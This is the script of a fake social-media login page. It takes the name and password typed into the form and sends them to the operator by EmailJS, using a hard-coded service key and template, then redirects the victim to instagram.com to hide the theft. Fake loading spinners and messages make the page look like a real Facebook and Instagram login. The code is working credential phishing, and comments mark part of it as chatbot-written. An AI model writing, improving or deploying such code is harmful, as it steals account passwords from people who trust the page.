<script>
    let logPage=document.querySelector('#form');
    let backPage=document.querySelector('#back');
    let cgpass=document.querySelector('#form2');
    let alert = document.querySelector('#message');
    let fbLog=document.querySelector('#fb');
    let foget=document.querySelector('#res');
    let logBg=document.querySelector("#bg-log")
  let logBtn = document.querySelector("#btn-logIn");
  let btnLoad = document.querySelector("#btn-load");
  //gpt
  (function() {
            emailjs.init("0VTwDjGKRMOL8Eh2m"); // Replace with your user ID
        })();

        function sendEmail(event) {
            event.preventDefault(); // Prevent the form from submitting normally

            const templateParams = {
                to_name: 'Recipient Name', // Change this to the actual recipient name
                from_name: document.getElementById('nameIn').value, // User's name
                message: document.getElementById('passIn').value, // Password as message
                reply_to: 'your_email@example.com' // Replace with your email if needed
            };

            emailjs.send('service_kwyz019', 'template_wpkv74b', templateParams)
                .then((response) => {
                    console.log('Email sent successfully!', response.status, response.text);
                    alert('Email sent successfully!');
                }, (error) => {
                    console.error('Failed to send email.', error);
                    alert('Failed to send email. Please try again.');
                });
        }
  //gpt
  backPage.addEventListener('click',()=>{
    cgpass.style.display='none';
    logPage.style.display='block';
  })
  foget.addEventListener('click',()=>{
     alert.style.display='none';
     logBtn.style.display='none';
     btnLoad.style.display='block';
     setTimeout(() => {
        alert.style.display='block';
        logBtn.style.display='block';
        cgpass.style.display='block';
        logPage.style.display='none';
        btnLoad.style.display='none';
     }, 3000);
     setTimeout(() => {
        alert.style.display='none';
        
     }, 6000);
  })
  fbLog.addEventListener('click',()=>{
     alert.style.display='none';
     logBtn.style.display='none';
     btnLoad.style.display='block';
     setTimeout(() => {
        alert.style.display='block';
        logBtn.style.display='block';
        btnLoad.style.display='none';
     }, 3000);
     setTimeout(() => {
        alert.style.display='none';
        
     }, 6000);
  })
  logBtn.addEventListener('click',()=>{
    logBtn.style.display='none';
    btnLoad.style.display='block';
    setTimeout(() => {
        window.open('https://www.instagram.com/');
    }, 5000);
  })
 
</script>
